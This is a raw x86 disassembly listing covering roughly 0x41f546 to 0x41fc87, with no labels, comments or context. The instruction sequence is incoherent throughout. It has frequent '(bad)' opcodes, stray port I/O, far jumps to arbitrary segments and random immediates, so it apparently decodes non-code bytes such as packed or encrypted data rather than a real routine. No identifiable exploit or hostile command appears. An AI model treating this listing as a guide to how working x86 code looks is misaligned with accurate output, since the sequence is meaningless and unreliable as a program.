  41f546:	sbb    DWORD PTR [edx+0x2eed56ea],0xa67fc8ae
  41f550:	pop    es
  41f551:	adc    eax,0x40b78e01
  41f556:	enter  0x316e,0x25
  41f55a:	push   0xffffffbb
  41f55c:	add    al,0x28
  41f55e:	push   ecx
  41f55f:	pop    esp
  41f560:	sub    DWORD PTR [esi-0x28],ebp
  41f563:	pushf  
  41f564:	or     al,0xaf
  41f566:	js     0x41f4f9
  41f568:	push   eax
  41f569:	cwde   
  41f56a:	in     eax,dx
  41f56b:	ins    DWORD PTR es:[edi],dx
  41f56c:	inc    eax
  41f56d:	ins    DWORD PTR es:[edi],dx
  41f56e:	sub    al,BYTE PTR [edx-0x79]
  41f571:	pop    esi
  41f572:	repz jb 0x41f55c
  41f575:	sbb    ch,BYTE PTR [edx-0x7b]
  41f578:	std    
  41f579:	mov    al,0xa8
  41f57b:	mov    al,ds:0xedc63b7a
  41f580:	in     al,0x45
  41f582:	je     0x41f5be
  41f584:	inc    DWORD PTR [edi-0x4d5d0eae]
  41f58a:	popa   
  41f58b:	push   ss
  41f58c:	sub    DWORD PTR [esi],eax
  41f58e:	xchg   esi,eax
  41f58f:	or     al,0x16
  41f591:	xchg   BYTE PTR [eax+esi*2+0x5e],bh
  41f595:	jne    0x41f60a
  41f597:	fdiv   QWORD PTR [edi-0x38]
  41f59a:	lock cwde 
  41f59c:	je     0x41f5b5
  41f59e:	fs imul ebp,ebp,0x6bbfff66
  41f5a5:	or     BYTE PTR [ecx+eax*4-0x3a9bc98d],ch
  41f5ac:	fwait
  41f5ad:	cmp    BYTE PTR [ecx+0x4],ah
  41f5b0:	dec    ebx
  41f5b1:	arpl   WORD PTR [edx+0x20],di
  41f5b4:	cmp    ecx,DWORD PTR [edx+0xe26d205]
  41f5ba:	xchg   ebp,eax
  41f5bb:	dec    edx
  41f5bc:	jno    0x41f5f7
  41f5be:	leave  
  41f5bf:	lods   eax,DWORD PTR ds:[esi]
  41f5c0:	mov    WORD PTR [ebx-0x13],ds
  41f5c3:	sbb    ebp,eax
  41f5c5:	popf   
  41f5c6:	xchg   edx,eax
  41f5c7:	rcr    BYTE PTR [ecx+ebx*1+0x3bcc1d60],0x9
  41f5cf:	mov    bh,0x6e
  41f5d1:	pop    ecx
  41f5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5d3:	mov    esp,0x17b25800
  41f5d8:	add    al,0x8a
  41f5da:	lds    ecx,FWORD PTR ds:0xd67195cc
  41f5e0:	add    al,0xe6
  41f5e2:	add    edx,edi
  41f5e4:	jnp    0x41f65a
  41f5e6:	in     eax,dx
  41f5e7:	mov    eax,ds:0xc78f0eae
  41f5ec:	adc    eax,0x7724b702
  41f5f1:	sub    al,0x6d
  41f5f3:	pop    ecx
  41f5f4:	lds    ebx,FWORD PTR [ecx+0x3c8313]
  41f5fa:	cli    
  41f5fb:	lods   eax,DWORD PTR ds:[esi]
  41f5fc:	scas   al,BYTE PTR es:[edi]
  41f5fd:	sbb    bh,al
  41f5ff:	lock dec edi
  41f601:	cmp    esp,0xe16852df
  41f607:	(bad)  
  41f608:	jae    0x41f5b0
  41f60a:	and    ebp,esi
  41f60c:	sahf   
  41f60d:	leave  
  41f60e:	mov    ebx,0x5b1d8b28
  41f613:	inc    esp
  41f614:	push   ds
  41f615:	sbb    esp,DWORD PTR [edx+0x7076169f]
  41f61b:	and    DWORD PTR [eax-0x18],ebx
  41f61e:	jae    0x41f5d9
  41f620:	imul   edi,edi,0xffffffde
  41f623:	or     cl,BYTE PTR ds:0xbeded083
  41f629:	(bad)  
  41f62a:	stc    
  41f62b:	sub    cl,ch
  41f62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f62e:	pushf  
  41f62f:	push   es
  41f630:	popa   
  41f631:	xchg   edi,eax
  41f632:	js     0x41f649
  41f634:	sahf   
  41f635:	lods   eax,DWORD PTR ds:[esi]
  41f636:	push   ds
  41f637:	adc    ch,BYTE PTR [edx-0x18]
  41f63a:	fadd   QWORD PTR [esi+ebp*8+0x6c92234d]
  41f641:	jg     0x41f622
  41f643:	(bad)  
  41f644:	mov    eax,0x46b94ffd
  41f649:	xchg   DWORD PTR [ebp-0x6ad4f9c5],esi
  41f64f:	push   es
  41f650:	lods   eax,DWORD PTR ds:[esi]
  41f651:	mov    eax,0xcc4552b4
  41f656:	jno    0x41f6d6
  41f658:	into   
  41f659:	and    BYTE PTR [edx+0x71],bl
  41f65c:	and    esp,ecx
  41f65e:	fild   WORD PTR [edi+eax*2-0x696b2be3]
  41f665:	sbb    BYTE PTR [edi],dl
  41f667:	push   ecx
  41f668:	not    DWORD PTR [edi+0x23]
  41f66b:	mov    eax,ds:0xd84877c8
  41f670:	fwait
  41f671:	popf   
  41f672:	adc    edi,edi
  41f674:	add    DWORD PTR [ebp-0x23],ebp
  41f677:	das    
  41f678:	jmp    0x41f6dc
  41f67a:	stos   BYTE PTR es:[edi],al
  41f67b:	pop    esp
  41f67c:	bound  esi,QWORD PTR [eax]
  41f67e:	jg     0x41f67d
  41f680:	mov    ebp,0x7d748296
  41f685:	pop    ebx
  41f686:	add    ebp,DWORD PTR [edx-0x25f6b19]
  41f68c:	(bad)  
  41f68d:	and    ebx,DWORD PTR [esi-0x7d]
  41f690:	push   ecx
  41f691:	pop    ebx
  41f692:	fwait
  41f693:	xchg   edx,eax
  41f694:	cs test al,0xa2
  41f697:	shl    BYTE PTR [ebx],0xc7
  41f69a:	aam    0x8e
  41f69c:	jo     0x41f709
  41f69e:	(bad)  
  41f69f:	fbstp  TBYTE PTR [ebx-0x7c01829d]
  41f6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6a6:	repz inc edi
  41f6a8:	dec    esi
  41f6a9:	pop    ebx
  41f6aa:	cli    
  41f6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ac:	pop    bp
  41f6ae:	xchg   edi,eax
  41f6af:	and    BYTE PTR [edi-0x724548d6],0x3c
  41f6b6:	mov    ds:0xce6c9c80,eax
  41f6bb:	or     eax,0x9ff3109d
  41f6c0:	sub    DWORD PTR [edx],ebx
  41f6c2:	fwait
  41f6c3:	inc    BYTE PTR gs:[esi+0x53]
  41f6c7:	sbb    eax,0x636c985d
  41f6cc:	out    dx,al
  41f6cd:	fnstenv [ebp+0x38]
  41f6d0:	jns    0x41f70d
  41f6d2:	ds (bad) 
  41f6d4:	pop    ebx
  41f6d5:	adc    al,0xbf
  41f6d7:	or     ch,bh
  41f6d9:	add    dh,BYTE PTR [ebx-0x6dcaf533]
  41f6df:	repnz sbb BYTE PTR [edi+0x61],ah
  41f6e3:	in     eax,0x44
  41f6e5:	int3   
  41f6e6:	inc    edi
  41f6e7:	add    DWORD PTR [ecx+0x370d7ed1],0xffffff9b
  41f6ee:	mov    bh,0x51
  41f6f0:	jmp    0x41f714
  41f6f2:	arpl   WORD PTR [eax-0x36],bx
  41f6f5:	leave  
  41f6f6:	not    bl
  41f6f8:	fcom   QWORD PTR [ecx]
  41f6fa:	push   esi
  41f6fb:	push   esi
  41f6fc:	dec    ebx
  41f6fd:	mov    dl,0x87
  41f6ff:	(bad)  
  41f700:	cwde   
  41f701:	cmp    al,0xaa
  41f703:	int3   
  41f704:	inc    esi
  41f705:	adc    al,0xf8
  41f707:	cwde   
  41f708:	scas   eax,DWORD PTR es:[edi]
  41f709:	xor    al,0x71
  41f70b:	xor    eax,0xf752f36b
  41f710:	rcr    ebx,cl
  41f712:	mov    eax,ds:0xec3578a2
  41f717:	mov    cl,0xcd
  41f719:	push   edi
  41f71a:	bt     ebp,ebx
  41f71d:	test   BYTE PTR [ebx-0x4d],0xde
  41f721:	popf   
  41f722:	xchg   esp,eax
  41f723:	outs   dx,BYTE PTR ds:[esi]
  41f724:	hlt    
  41f725:	loop   0x41f70e
  41f727:	js     0x41f760
  41f729:	stc    
  41f72a:	popa   
  41f72b:	cmp    edi,DWORD PTR [ecx+0x3cce86a9]
  41f731:	stos   BYTE PTR es:[edi],al
  41f732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f733:	pusha  
  41f734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f735:	outs   dx,DWORD PTR ds:[esi]
  41f736:	test   DWORD PTR [eax-0x7a],ecx
  41f739:	cmp    BYTE PTR [eiz*1-0x2b39cd],ch
  41f740:	add    eax,0x7f35ea5d
  41f745:	jb     0x41f6f9
  41f747:	clc    
  41f748:	(bad)  
  41f749:	hlt    
  41f74a:	pop    eax
  41f74b:	pop    edx
  41f74c:	outs   dx,DWORD PTR ds:[esi]
  41f74d:	call   0x1092b477
  41f752:	leave  
  41f753:	or     eax,0xba2d3e00
  41f758:	cdq    
  41f759:	clc    
  41f75a:	pushf  
  41f75b:	aas    
  41f75c:	add    al,0x68
  41f75e:	mov    bh,BYTE PTR [ebp+edi*4+0x18]
  41f762:	(bad)  
  41f763:	mov    dl,0x58
  41f765:	test   DWORD PTR [eax+0x4],ebp
  41f768:	mov    ah,0x23
  41f76b:	cli    
  41f76c:	adc    DWORD PTR [edx],0xffffffc7
  41f76f:	std    
  41f770:	jle    0x41f73c
  41f772:	pop    esi
  41f773:	and    al,0xc8
  41f775:	xchg   ecx,eax
  41f776:	aas    
  41f777:	fwait
  41f778:	cmp    eax,0x9ad2ac6f
  41f77d:	sbb    bl,bh
  41f77f:	mov    al,ds:0x7a3899e5
  41f784:	div    DWORD PTR [edi+0x5c15a058]
  41f78a:	je     0x41f7c6
  41f78c:	jmp    0xaa20:0x609ea902
  41f793:	sbb    DWORD PTR [ebp+0x38],ebx
  41f796:	aas    
  41f797:	stos   BYTE PTR es:[edi],al
  41f798:	pop    ss
  41f799:	aas    
  41f79a:	scas   al,BYTE PTR es:[edi]
  41f79b:	les    esp,FWORD PTR ds:0x90fbc8f
  41f7a1:	xlat   BYTE PTR ds:[ebx]
  41f7a2:	mov    bh,0xe2
  41f7a4:	(bad)  
  41f7a5:	popa   
  41f7a6:	jns    0x41f7d2
  41f7a8:	jns    0x41f79a
  41f7aa:	call   0x6525:0x2979ab3f
  41f7b1:	jno    0x41f7ae
  41f7b3:	mov    ebx,DWORD PTR [di+0x73]
  41f7b7:	inc    ebx
  41f7b8:	outs   dx,BYTE PTR ds:[esi]
  41f7b9:	xchg   DWORD PTR [ecx],edi
  41f7bb:	add    eax,0x3b5c57ef
  41f7c0:	in     al,0xb0
  41f7c2:	add    BYTE PTR [edx-0x573f7510],bl
  41f7c8:	mov    eax,0x53e270ea
  41f7cd:	inc    edi
  41f7ce:	and    al,0x34
  41f7d0:	retf   0x625d
  41f7d3:	(bad)  
  41f7d4:	aas    
  41f7d5:	pop    ebx
  41f7d6:	inc    esi
  41f7d7:	in     eax,0xb3
  41f7d9:	xor    al,0xed
  41f7db:	sbb    ebp,DWORD PTR [ebx+0x7d642538]
  41f7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e2:	sbb    eax,0x45187bc
  41f7e7:	retf   
  41f7e8:	push   ebp
  41f7e9:	dec    eax
  41f7ea:	mov    bh,0x1b
  41f7ec:	sub    edi,DWORD PTR [ecx]
  41f7ee:	mov    esi,0x4999a296
  41f7f3:	adc    al,0xee
  41f7f5:	idiv   BYTE PTR [ebp-0x4bed2c50]
  41f7fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7fc:	int    0x23
  41f7fe:	lock sub al,0x37
  41f801:	dec    ecx
  41f802:	or     DWORD PTR [edx+0x7e797b5a],ecx
  41f808:	fidiv  DWORD PTR [edx]
  41f80a:	sti    
  41f80b:	mov    ecx,0x1c1b6328
  41f810:	je     0x41f857
  41f812:	addr16 js 0x41f876
  41f815:	loop   0x41f7ba
  41f817:	jge    0xa737f97d
  41f81d:	or     dh,dh
  41f81f:	cdq    
  41f820:	ret    
  41f821:	cdq    
  41f822:	xor    BYTE PTR [ebx-0x49],cl
  41f825:	pop    esp
  41f826:	cdq    
  41f827:	sub    BYTE PTR [ecx+0x7233beec],cl
  41f82d:	xchg   ebp,eax
  41f82e:	and    DWORD PTR [edi],esp
  41f830:	mov    ebx,0x376e57ab
  41f835:	test   DWORD PTR ds:0x8fafb30e,0xe96d1c03
  41f83f:	daa    
  41f840:	into   
  41f841:	(bad)  
  41f842:	fsubrp st(1),st
  41f844:	clc    
  41f845:	mov    ebx,esp
  41f847:	cmp    bh,BYTE PTR [ebx+eax*4-0x58]
  41f84b:	jns    0x41f7ec
  41f84d:	and    DWORD PTR [edi-0x4684cd29],eax
  41f853:	add    BYTE PTR [ecx+edi*2-0x58a74aa1],bh
  41f85a:	xor    al,0x66
  41f85c:	mov    esi,0xd57c6c87
  41f861:	sar    BYTE PTR [edx],1
  41f863:	jl     0x41f809
  41f865:	cmp    eax,0x106cd613
  41f86a:	fdiv   DWORD PTR [ecx+0x47]
  41f86d:	rcl    BYTE PTR [esi],1
  41f86f:	std    
  41f870:	pop    ebx
  41f871:	pop    eax
  41f872:	aam    0x6c
  41f874:	mov    bl,0x41
  41f876:	sub    eax,0x1f8e9d6
  41f87b:	imul   edx,DWORD PTR [ebx],0xfffffff1
  41f87e:	repnz sbb ecx,DWORD PTR [ebx]
  41f881:	jecxz  0x41f80f
  41f883:	mov    dh,0xaf
  41f885:	or     BYTE PTR [edi+0x69],bl
  41f888:	mov    gs,WORD PTR [eax+0x16c4dddd]
  41f88e:	loopne 0x41f883
  41f890:	or     edi,ecx
  41f892:	cmp    esp,DWORD PTR [edi+0x4d]
  41f895:	adc    al,BYTE PTR [eax]
  41f897:	(bad)  
  41f898:	xor    BYTE PTR [ebp+eax*1+0x1],0x63
  41f89d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f89e:	jae    0x41f8ef
  41f8a0:	dec    eax
  41f8a1:	div    BYTE PTR [ebx+0x62dc36a8]
  41f8a7:	ret    0x639e
  41f8aa:	inc    ebp
  41f8ab:	sahf   
  41f8ac:	test   eax,esp
  41f8ae:	push   ds
  41f8af:	bound  eax,QWORD PTR [eax-0x12]
  41f8b2:	lds    ebp,FWORD PTR [edi-0x4e]
  41f8b5:	mov    edi,esi
  41f8b7:	jb     0x41f8b7
  41f8b9:	fisubr WORD PTR [eax+0x2416d2a2]
  41f8bf:	cmp    BYTE PTR [edi-0x1b92f691],ah
  41f8c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8c6:	iret   
  41f8c7:	mov    cl,0x8
  41f8c9:	mov    eax,ds:0x6f0aa4cd
  41f8ce:	loopne 0x41f870
  41f8d0:	add    eax,0x548345a
  41f8d5:	fistp  WORD PTR [ebx]
  41f8d7:	xchg   edi,eax
  41f8d8:	int    0x74
  41f8da:	pusha  
  41f8db:	shr    DWORD PTR [esi],cl
  41f8dd:	add    eax,DWORD PTR [eax-0x55]
  41f8e0:	inc    ebp
  41f8e1:	in     al,0x44
  41f8e3:	ficom  DWORD PTR [eax+0x55]
  41f8e6:	test   al,0x46
  41f8e8:	mov    esp,0x2a1784c2
  41f8ed:	pop    ss
  41f8ee:	xchg   edx,eax
  41f8ef:	imul   ebp,DWORD PTR [ebp-0x7a],0x68d61e5a
  41f8f6:	mov    ah,0xb4
  41f8f8:	cdq    
  41f8f9:	jns    0x41f95b
  41f8fb:	aas    
  41f8fc:	push   edi
  41f8fd:	sbb    dh,BYTE PTR [esp+ebp*4-0x73]
  41f901:	stos   DWORD PTR es:[edi],eax
  41f902:	in     eax,0x50
  41f904:	add    DWORD PTR ds:0x5d877ca4,0x311f8695
  41f90e:	aam    0x2c
  41f910:	out    0x75,al
  41f912:	aaa    
  41f913:	inc    esp
  41f914:	ret    
  41f915:	sbb    esi,DWORD PTR [ebp+edi*4+0x2151fb69]
  41f91c:	push   ecx
  41f91d:	inc    ecx
  41f91e:	jae    0x41f99a
  41f920:	aam    0xa0
  41f922:	arpl   WORD PTR [eax],bx
  41f924:	nop
  41f925:	enter  0xd25f,0x9b
  41f929:	jl     0x41f8b8
  41f92b:	nop
  41f92c:	ja     0x41f94e
  41f92e:	fnsave [esi+0x2b821047]
  41f934:	lds    ecx,FWORD PTR [edi-0x16]
  41f937:	pop    ecx
  41f938:	mov    ecx,0x16ddbab0
  41f93d:	iret   
  41f93e:	shr    DWORD PTR [edi-0x19],cl
  41f941:	and    edx,DWORD PTR [eax-0x5cd8944c]
  41f947:	fstp   QWORD PTR [esp+ecx*1+0x47]
  41f94b:	fild   QWORD PTR [edx+0x79431542]
  41f951:	xchg   ebp,eax
  41f952:	push   edi
  41f953:	pop    es
  41f954:	jb     0x41f968
  41f956:	retf   0xb269
  41f959:	cmp    ecx,ecx
  41f95b:	data16 mov ds:0x8598dd82,al
  41f961:	jle    0x41f985
  41f963:	cld    
  41f964:	in     al,dx
  41f965:	nop
  41f966:	les    ebp,FWORD PTR [ecx-0x42]
  41f969:	mov    edx,DWORD PTR [ecx-0x75eebe4a]
  41f96f:	and    eax,0x19085295
  41f974:	mov    ebp,DWORD PTR [ebp+0x17e6181]
  41f97a:	les    esi,FWORD PTR [eax]
  41f97c:	jne    0x41f9fd
  41f97e:	cs out 0x3f,al
  41f981:	outs   dx,DWORD PTR ds:[esi]
  41f982:	into   
  41f983:	push   ss
  41f984:	lods   eax,DWORD PTR ds:[esi]
  41f985:	mov    dl,0x6e
  41f987:	lahf   
  41f988:	inc    ecx
  41f989:	adc    al,0x8a
  41f98b:	ror    ch,1
  41f98d:	repz mov bh,0xec
  41f990:	cmp    BYTE PTR [edi-0x1b],dh
  41f993:	int3   
  41f994:	sub    DWORD PTR [eax+0x10],ecx
  41f997:	retf   0xc1ae
  41f99a:	mov    ch,0x3c
  41f99c:	pop    ebp
  41f99d:	jnp    0x41f935
  41f99f:	(bad)  [esi-0x45c8c849]
  41f9a5:	mov    al,0x9a
  41f9a7:	arpl   WORD PTR [ecx-0x50e2b2e],bp
  41f9ad:	xchg   ebp,eax
  41f9ae:	mov    ebp,DWORD PTR ds:0xdc3f9872
  41f9b4:	adc    al,bh
  41f9b6:	pop    ss
  41f9b7:	retf   0x2846
  41f9ba:	jae    0x41f9a3
  41f9bc:	aas    
  41f9bd:	jmp    0x69af1656
  41f9c2:	cwde   
  41f9c3:	mov    ebx,0xd8f96f60
  41f9c8:	jl     0x41f9cf
  41f9ca:	push   ss
  41f9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9cc:	in     al,dx
  41f9cd:	jno    0x41f9ee
  41f9cf:	sub    BYTE PTR [ecx+0x154f52e8],0xe7
  41f9d6:	dec    edi
  41f9d7:	lods   eax,DWORD PTR ds:[esi]
  41f9d8:	sub    ebp,DWORD PTR [ecx+0x65bebc2]
  41f9de:	iret   
  41f9df:	leave  
  41f9e0:	cmc    
  41f9e1:	jmp    0xb763:0x2ee53836
  41f9e8:	mov    ch,BYTE PTR [ebp-0x22ec5b08]
  41f9ee:	pop    ebp
  41f9ef:	cdq    
  41f9f0:	add    DWORD PTR [edx],ebp
  41f9f2:	rol    ebx,0x5f
  41f9f5:	push   ebp
  41f9f6:	sbb    BYTE PTR [esi],al
  41f9f8:	cmp    BYTE PTR [edi+0x16],dh
  41f9fb:	(bad)  
  41f9fc:	push   esi
  41f9fd:	test   al,0xe3
  41f9ff:	cwde   
  41fa00:	out    0xb0,al
  41fa02:	dec    ecx
  41fa03:	cmc    
  41fa04:	gs xor eax,0xad79515b
  41fa0a:	or     DWORD PTR [ebp+0x6184e959],edi
  41fa10:	arpl   ax,si
  41fa12:	cmp    al,0x51
  41fa14:	rol    BYTE PTR [ebp-0x6d3d0c8d],0xb0
  41fa1b:	cdq    
  41fa1c:	jmp    0x13ab:0xc4baef6a
  41fa23:	mov    WORD PTR [ebp+0x35],gs
  41fa26:	inc    esi
  41fa27:	aas    
  41fa28:	inc    edi
  41fa29:	aas    
  41fa2a:	and    eax,0x4aa85c3
  41fa2f:	bound  ecx,QWORD PTR [ebp+0x6ed3bd60]
  41fa35:	sub    esi,DWORD PTR [edx-0x5]
  41fa38:	ins    DWORD PTR es:[edi],dx
  41fa39:	out    0x31,al
  41fa3b:	add    DWORD PTR [edi+0x41],edx
  41fa3e:	or     eax,0x91091423
  41fa43:	xor    DWORD PTR [eax-0x59d42eca],esp
  41fa49:	js     0x41fa40
  41fa4b:	sub    al,BYTE PTR [ecx-0x63]
  41fa4e:	rcr    DWORD PTR [edi-0x2a],0xd
  41fa52:	xor    al,0xfa
  41fa54:	fiadd  WORD PTR [edi+0xbfc89d7]
  41fa5a:	mov    dl,0x70
  41fa5c:	test   al,0xc6
  41fa5e:	cmp    BYTE PTR [edi-0x6f],ah
  41fa61:	mov    edi,0x3a2e1f3b
  41fa66:	mov    eax,edx
  41fa68:	sbb    BYTE PTR [ecx-0x3a74c266],dh
  41fa6e:	adc    ebp,DWORD PTR [edi]
  41fa70:	sar    DWORD PTR [ebp-0x2b],cl
  41fa73:	je     0x41fa0c
  41fa75:	call   FWORD PTR [esi]
  41fa77:	cmp    BYTE PTR [edi],cl
  41fa79:	fist   WORD PTR [eax+0x0]
  41fa7c:	inc    esp
  41fa7d:	mov    dl,0x67
  41fa7f:	pop    edx
  41fa80:	sub    BYTE PTR [edx+eax*2],0x4
  41fa84:	mov    bl,0x4d
  41fa86:	lahf   
  41fa87:	push   ebp
  41fa88:	push   cs
  41fa89:	or     BYTE PTR [esp+ebp*8+0x3e],ch
  41fa8d:	dec    ecx
  41fa8e:	js     0x41faa2
  41fa90:	xor    ebx,DWORD PTR [ecx-0x7c4f3156]
  41fa96:	and    dl,al
  41fa98:	dec    ecx
  41fa99:	jmp    0x7e9991a4
  41fa9e:	aaa    
  41fa9f:	lea    esi,[esi+edx*8]
  41faa2:	fimul  DWORD PTR [esi+edx*1]
  41faa5:	xor    eax,ebp
  41faa7:	sbb    DWORD PTR [esi],esi
  41faa9:	shl    dh,0x48
  41faac:	hlt    
  41faad:	sub    bh,BYTE PTR gs:[esi-0x58]
  41fab1:	sub    eax,0xaf5b872e
  41fab6:	pop    ebp
  41fab7:	add    DWORD PTR [ebp+0x45],edi
  41faba:	xor    esi,edx
  41fabc:	test   DWORD PTR [eax-0x50],0x7a07eefb
  41fac3:	cli    
  41fac4:	pop    edi
  41fac5:	mov    bl,0xa2
  41fac7:	push   esi
  41fac8:	and    edx,esp
  41faca:	dec    BYTE PTR [esi+0x2b]
  41facd:	or     eax,0xff0cb785
  41fad2:	repnz push 0x2ef8d995
  41fad8:	push   esp
  41fad9:	aam    0x75
  41fadb:	daa    
  41fadc:	push   cs
  41fadd:	or     ch,dl
  41fadf:	imul   ebp,ebp,0x63e88de0
  41fae5:	pop    ebp
  41fae6:	jmp    0xb02a644d
  41faeb:	(bad)  
  41faec:	loopne 0x41faf0
  41faee:	xor    DWORD PTR [esi-0x7a],edx
  41faf1:	xchg   edx,eax
  41faf2:	mov    esi,0xff760d5a
  41faf7:	mov    cl,dl
  41faf9:	add    al,0xc2
  41fafb:	jb     0x41fb03
  41fafd:	cmp    al,0x2b
  41faff:	retf   
  41fb00:	xchg   esp,eax
  41fb01:	dec    ecx
  41fb02:	(bad)  
  41fb03:	leave  
  41fb04:	xchg   ecx,eax
  41fb05:	leave  
  41fb06:	and    BYTE PTR [ebp+0x654f30b],bl
  41fb0c:	arpl   WORD PTR [edi+edi*2],dx
  41fb0f:	inc    esp
  41fb10:	lods   eax,DWORD PTR ds:[esi]
  41fb11:	pop    esi
  41fb12:	cs not dl
  41fb15:	out    0xe1,eax
  41fb17:	inc    edx
  41fb18:	jle    0x41fadc
  41fb1a:	push   cs
  41fb1b:	repnz pop ecx
  41fb1d:	pop    ds
  41fb1e:	mov    WORD PTR [edi-0x4df1b321],fs
  41fb24:	sbb    bh,dh
  41fb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb27:	fisttp WORD PTR [esi+edx*8+0x1ea6acac]
  41fb2e:	inc    ebx
  41fb2f:	and    DWORD PTR [ebp+0x910c6c9],esi
  41fb35:	stos   DWORD PTR es:[edi],eax
  41fb36:	xchg   edx,eax
  41fb37:	leave  
  41fb38:	repnz fisttp QWORD PTR ds:0xfbb29a44
  41fb3f:	out    dx,al
  41fb40:	pop    DWORD PTR [eax+0x2a]
  41fb43:	add    esi,esi
  41fb45:	jmp    0x3389:0xfab918cb
  41fb4c:	rcr    BYTE PTR [edx+0x73],cl
  41fb4f:	jbe    0x41faff
  41fb51:	shl    BYTE PTR [ecx+edx*4],cl
  41fb54:	sahf   
  41fb55:	adc    bl,BYTE PTR [esi-0x6a]
  41fb58:	lock mov ds:0x6f572b69,al
  41fb5e:	hlt    
  41fb5f:	jno    0x41fb8a
  41fb61:	push   ss
  41fb62:	dec    ebp
  41fb63:	int    0x8d
  41fb65:	(bad)  
  41fb66:	int    0xa4
  41fb68:	aaa    
  41fb69:	lock mov al,ds:0x8eeaaaa9
  41fb6f:	lea    ebp,[eax]
  41fb71:	cmc    
  41fb72:	mov    ebp,0x64becf77
  41fb77:	leave  
  41fb78:	loopne 0x41fb70
  41fb7a:	not    BYTE PTR [esi]
  41fb7c:	mov    es,WORD PTR [ecx]
  41fb7e:	jne    0x41fb14
  41fb80:	jmp    0x41fbfb
  41fb82:	(bad)  
  41fb83:	inc    eax
  41fb84:	xchg   ecx,eax
  41fb85:	push   es
  41fb86:	push   0xb9a9a3b1
  41fb8b:	idiv   BYTE PTR [ebx+0x56]
  41fb8e:	cdq    
  41fb8f:	scas   eax,DWORD PTR es:[edi]
  41fb90:	adc    BYTE PTR [ebp+edi*1+0x41cade20],bh
  41fb97:	scas   eax,DWORD PTR es:[edi]
  41fb98:	popa   
  41fb99:	or     al,BYTE PTR [eax+0x57ae6415]
  41fb9f:	fsubr  DWORD PTR [ebp+ebp*4+0x21fa740f]
  41fba6:	inc    esp
  41fba7:	or     al,0x35
  41fba9:	retf   0x13c4
  41fbac:	sbb    ecx,0xffffffd1
  41fbaf:	jno    0x41fbb5
  41fbb1:	scas   eax,DWORD PTR es:[edi]
  41fbb2:	ins    BYTE PTR es:[edi],dx
  41fbb3:	aam    0xa8
  41fbb5:	jmp    0x28c:0x7e2b9cc9
  41fbbc:	ficom  WORD PTR [edi+eax*1+0x67]
  41fbc0:	pcmpgtd mm7,QWORD PTR [edi+0x6a]
  41fbc4:	std    
  41fbc5:	jb     0x41fb4a
  41fbc7:	shr    ah,cl
  41fbc9:	inc    esi
  41fbca:	into   
  41fbcb:	mov    ebp,0xd1412dc
  41fbd0:	jl     0x41fc2e
  41fbd2:	push   ecx
  41fbd3:	xor    eax,0x215605cb
  41fbd8:	addr16 mov ch,0x34
  41fbdb:	sub    BYTE PTR [ecx],bl
  41fbdd:	mov    cl,0x6f
  41fbdf:	or     ebx,DWORD PTR [ebp-0x2b]
  41fbe2:	and    ecx,DWORD PTR [eax+0x40]
  41fbe5:	lods   eax,DWORD PTR ds:[esi]
  41fbe6:	cmp    eax,0x556cea61
  41fbeb:	stos   DWORD PTR es:[edi],eax
  41fbec:	inc    ebx
  41fbed:	hlt    
  41fbee:	mov    eax,0xffa6303
  41fbf3:	pop    edi
  41fbf4:	fucomp st(4)
  41fbf6:	sbb    al,0xbc
  41fbf8:	cld    
  41fbf9:	out    dx,al
  41fbfa:	aaa    
  41fbfb:	add    eax,0x1c70ca9d
  41fc00:	jnp    0x41fc63
  41fc02:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc04:	sub    edx,0xa4363990
  41fc0a:	sub    eax,0xbd872fd5
  41fc0f:	sar    eax,cl
  41fc11:	pop    edx
  41fc12:	shr    DWORD PTR [eax+0x55442e5a],1
  41fc18:	xchg   esp,eax
  41fc19:	and    al,0xd6
  41fc1b:	stos   DWORD PTR es:[edi],eax
  41fc1c:	ficomp DWORD PTR [esi]
  41fc1e:	inc    eax
  41fc1f:	jno    0x41fc6d
  41fc21:	xchg   ebp,eax
  41fc22:	in     eax,dx
  41fc23:	mov    eax,ss:0x406ec7a7
  41fc29:	test   eax,0x7be5942
  41fc2e:	pop    esp
  41fc2f:	jo     0x41fc4c
  41fc31:	xor    edx,eax
  41fc33:	push   ss
  41fc34:	test   BYTE PTR [eax],al
  41fc36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc37:	jno    0x41fbcf
  41fc39:	mov    ch,0xed
  41fc3b:	inc    ecx
  41fc3c:	lods   eax,DWORD PTR ds:[esi]
  41fc3d:	xor    eax,0x9076f44a
  41fc42:	out    dx,al
  41fc43:	xchg   ebp,eax
  41fc44:	dec    eax
  41fc45:	jo     0x41fc0e
  41fc47:	xchg   esp,eax
  41fc48:	cs mov edx,0x62e0f213
  41fc4e:	mov    esi,0x7bbf5c3a
  41fc53:	ror    DWORD PTR [edi],cl
  41fc55:	mov    cx,WORD PTR [ecx+ebx*2+0x3a6436e0]
  41fc5d:	push   esp
  41fc5e:	loop   0x41fcbb
  41fc60:	jmp    0x41fc6b
  41fc62:	push   0xffffff92
  41fc64:	mov    al,0x15
  41fc66:	js     0x41fbf2
  41fc68:	xlat   BYTE PTR ds:[ebx]
  41fc69:	pusha  
  41fc6a:	aaa    
  41fc6b:	std    
  41fc6c:	inc    esi
  41fc6d:	sahf   
  41fc6e:	inc    edx
  41fc6f:	dec    esi
  41fc70:	in     al,0x99
  41fc72:	xchg   BYTE PTR ss:[edx+0x3c4da03],dh
  41fc79:	scas   eax,DWORD PTR es:[edi]
  41fc7a:	mov    ah,0x7b
  41fc7c:	lods   ax,WORD PTR ds:[esi]
  41fc7e:	lock stos DWORD PTR es:[edi],eax
  41fc80:	or     al,BYTE PTR [ebp-0x17]
  41fc83:	out    0x17,eax
  41fc85:	jns    0x41fc4f
  41fc87:	enter  0x1392,0x76
